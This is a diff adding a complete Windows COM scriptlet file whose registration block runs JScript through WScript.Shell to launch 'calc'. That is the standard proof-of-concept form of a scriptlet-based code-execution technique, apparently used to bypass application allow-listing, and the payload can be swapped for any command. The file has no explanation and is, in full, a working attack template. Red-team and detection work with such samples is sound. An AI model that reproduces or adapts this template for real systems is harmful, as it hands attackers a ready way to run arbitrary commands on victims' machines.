@@ -1,0 +1,10 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration classid="{AAAA1111-CCCC-DDDD-0000-0001FEE4BCAC}">
+	<script language="JScript">
+		<![CDATA[
+            var r = new ActiveXObject("WScript.Shell").Run("calc");
+		]]>
+	</script>
+</registration>
+</scriptlet>
